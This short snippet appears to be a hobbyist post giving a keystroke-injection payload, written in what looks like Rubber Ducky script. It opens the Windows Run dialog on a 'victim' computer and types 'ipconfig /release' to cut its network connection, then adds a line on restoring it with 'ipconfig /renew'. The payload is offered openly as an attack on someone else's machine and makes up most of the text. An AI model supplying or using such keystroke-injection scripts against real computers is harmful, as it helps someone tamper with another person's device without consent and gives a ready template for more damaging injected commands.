Disconnect the victim computer from the Wi-Fi by using this script.
```
DEFAULT_DELAY 100
SLEEP 500
GUI r
STRING ipconfig /release
ENTER
```
To bring the connection back, type the command "ipconfig /renew" into the Run dialogue or Command Prompt.